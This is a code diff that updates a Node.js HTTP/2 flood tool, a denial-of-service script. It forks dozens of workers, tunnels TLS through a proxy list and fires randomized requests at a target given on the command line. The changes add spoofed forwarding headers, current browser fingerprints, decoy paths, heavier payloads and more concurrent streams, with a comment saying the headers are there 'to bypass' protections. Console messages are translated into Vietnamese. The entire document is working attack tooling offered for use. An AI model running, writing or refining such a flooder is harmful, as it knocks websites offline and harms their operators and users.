@@ -45,7 +45,7 @@ const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     rate: parseInt(process.argv[4]),
-    threads: parseInt(process.argv[5]) || 48, // Default to 48 threads to match CPU cores
+    threads: parseInt(process.argv[5]) || 48,
     proxyFile: process.argv[6]
 };
 
@@ -59,50 +59,45 @@ const sigalgs = [
 ];
 
 const ciphers = [
+    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384',
     'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
     'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
-    'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
-    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384'
+    'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305'
 ];
 
 const accept_header = [
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
     'application/json, text/plain, */*',
     'text/css,*/*;q=0.1',
-    'application/javascript, */*;q=0.8',
-    '*/*'
+    'application/javascript, */*;q=0.8'
 ];
 
 const lang_header = [
     'en-US,en;q=0.9',
     'zh-CN,zh;q=0.8',
     'fr-FR,fr;q=0.9',
-    'ja-JP,ja;q=0.8',
-    'de-DE,de;q=0.9',
-    'es-ES,es;q=0.8'
+    'ja-JP,ja;q=0.8'
 ];
 
 const encoding_header = [
     'gzip, deflate, br',
     'gzip, deflate',
     'br',
-    'deflate',
     '*'
 ];
 
 const version = [
-    '"Google Chrome";v="117", "Chromium";v="117", ";Not A Brand";v="99"',
-    '"Microsoft Edge";v="117", "Chromium";v="117"',
-    '"Firefox";v="118", ";Not A Brand";v="99"',
-    '"Safari";v="16.6", "Chrome";v="117.0.0.0"'
+    '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+    '"Microsoft Edge";v="129", "Chromium";v="129"',
+    '"Firefox";v="130", "Gecko";v="20100101"',
+    '"Safari";v="17.6", "AppleWebKit";v="605.1.15"'
 ];
 
 const referers = [
     'https://www.google.com/',
     'https://www.bing.com/',
     'https://www.facebook.com/',
-    'https://www.youtube.com/',
-    'https://' + parsedTarget.host + '/',
+    'https://' + url.parse(args.target).host + '/',
     ''
 ];
 
@@ -117,24 +112,36 @@ const platforms = [
 const custom_headers = [
     { 'x-forwarded-for': () => randstr(12) },
     { 'x-real-ip': () => randstr(12) },
-    { 'via': () => `1.1 ${randstr(8)}.cloudfront.net (CloudFront)` },
-    { 'cache-control': () => randomElement(['no-cache', 'max-age=0']) },
-    { 'pragma': 'no-cache' }
+    { 'via': () => `2.0 ${randstr(8)}.cloudfront.net` },
+    { 'cache-control': () => randomElement(['no-cache', 'max-age=0', 'no-store']) },
+    { 'pragma': 'no-cache' },
+    { 'x-requested-with': 'XMLHttpRequest' }
+];
+
+const fake_paths = [
+    '/api/v1/', '/login', '/signup', '/profile', '/search', '/assets', '/static', '/home'
 ];
 
 const parsedTarget = url.parse(args.target);
 const proxies = readLines(args.proxyFile);
+let requestCounter = 0;
 
 if (cluster.isMaster) {
     console.clear();
-    console.log(`\x1b[1m\x1b[34mTarget: \x1b[0m${parsedTarget.host}`);
-    console.log(`\x1b[1m\x1b[33mDuration: \x1b[0m${args.time} seconds`);
-    console.log(`\x1b[1m\x1b[32mThreads: \x1b[0m${args.threads}`);
-    console.log(`\x1b[1m\x1b[31mRequests per second per thread: \x1b[0m${args.rate}`);
+    console.log(`🎯 Mục tiêu: ${parsedTarget.host}`);
+    console.log(`⏰ Thời gian: ${args.time} giây`);
+    console.log(`🧵 Threads: ${args.threads}`);
+    console.log(`🚀 Requests mỗi thread mỗi chu kỳ: ${args.rate}`);
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
     }
-    setTimeout(() => process.exit(0), args.time * 1000);
+    setInterval(() => {
+        console.log(`📊 Tổng requests gửi: ${requestCounter}`);
+    }, 5000);
+    setTimeout(() => {
+        console.log(`🏁 Kết thúc, tổng requests: ${requestCounter}`);
+        process.exit(0);
+    }, args.time * 1000);
 } else {
     runFlooder();
 }
@@ -161,19 +168,19 @@ class NetSocket {
         connection.on("data", chunk => {
             if (!chunk.toString("utf-8").includes("HTTP/1.1 200")) {
                 connection.destroy();
-                return callback(undefined, "error: invalid proxy response");
+                return callback(undefined, "lỗi: proxy không hợp lệ");
             }
             return callback(connection);
         });
 
         connection.on("timeout", () => {
             connection.destroy();
-            callback(undefined, "error: timeout");
+            callback(undefined, "lỗi: hết thời gian");
         });
 
         connection.on("error", () => {
             connection.destroy();
-            callback(undefined, "error: connection failed");
+            callback(undefined, "lỗi: kết nối thất bại");
         });
     }
 }
@@ -181,10 +188,15 @@ class NetSocket {
 const Socker = new NetSocket();
 
 function generateHeaders() {
+    const method = randomElement(methods);
+    const path = Math.random() < 0.6 ? 
+        `${parsedTarget.path}?${randstr(10)}=${randstr(8)}` : 
+        randomElement(fake_paths) + `?${randstr(6)}=${randstr(4)}`;
+    
     const headers = {
-        ":method": randomElement(methods),
+        ":method": method,
         ":authority": parsedTarget.host,
-        ":path": parsedTarget.path + (Math.random() < 0.7 ? `?${randstr(8)}=${randstr(6)}` : `/${randstr(5)}`),
+        ":path": path,
         ":scheme": "https",
         "sec-ch-ua": randomElement(version),
         "sec-ch-ua-platform": randomElement(platforms),
@@ -193,14 +205,15 @@ function generateHeaders() {
         "accept-language": randomElement(lang_header),
         "accept": randomElement(accept_header),
         "referer": randomElement(referers),
-        "sec-fetch-mode": randomElement(["navigate", "same-origin", "cors"]),
-        "sec-fetch-dest": randomElement(["document", "script", "style", "image"]),
-        "sec-fetch-site": randomElement(["same-origin", "cross-site", "none"]),
-        "upgrade-insecure-requests": "1"
+        "sec-fetch-mode": randomElement(["navigate", "same-origin", "cors", "websocket"]),
+        "sec-fetch-dest": randomElement(["document", "script", "style", "image", "empty"]),
+        "sec-fetch-site": randomElement(["same-origin", "cross-site", "same-site", "none"]),
+        "upgrade-insecure-requests": "1",
+        "user-agent": `Mozilla/5.0 (${randomElement(platforms)}; ${Math.random() < 0.5 ? 'Win64; x64' : 'MacIntel'}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36`
     };
 
-    // Add 1-3 random custom headers for bypass
-    for (let i = 0; i < randomIntn(1, 4); i++) {
+    // Thêm 2-4 header ngẫu nhiên để bypass
+    for (let i = 0; i < randomIntn(2, 5); i++) {
         const header = randomElement(custom_headers);
         Object.assign(headers, typeof header[Object.keys(header)[0]] === 'function' ? 
             { [Object.keys(header)[0]]: header[Object.keys(header)[0]]() } : header);
@@ -217,7 +230,7 @@ function runFlooder() {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
-        timeout: 3
+        timeout: 2
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
@@ -230,14 +243,15 @@ function runFlooder() {
             ALPNProtocols: randomElement([['h2'], ['h2', 'http/1.1'], ['http/1.1']]),
             ciphers: randomElement(ciphers),
             sigalgs: randomElement(sigalgs),
-            ecdhCurve: randomElement(['P-256', 'P-384', 'auto']),
+            ecdhCurve: randomElement(['P-256', 'P-384', 'P-521']),
             host: parsedTarget.host,
             servername: parsedTarget.host,
             rejectUnauthorized: false,
             socket: connection,
             secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                 crypto.constants.SSL_OP_NO_TICKET |
-                crypto.constants.SSL_OP_NO_COMPRESSION
+                crypto.constants.SSL_OP_NO_COMPRESSION |
+                crypto.constants.SSL_OP_NO_RENEGOTIATION
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
@@ -247,7 +261,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 5000,
+                maxConcurrentStreams: 10000,
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536,
                 enablePush: false
@@ -261,8 +275,9 @@ function runFlooder() {
                     const headers = generateHeaders();
                     const request = client.request(headers);
                     if (["POST", "PUT", "PATCH"].includes(headers[":method"])) {
-                        request.write(randomPayload(randomIntn(50, 500)));
+                        request.write(randomPayload(randomIntn(100, 1000)));
                     }
+                    requestCounter++;
                     request.on("response", () => {
                         request.close();
                         request.destroy();
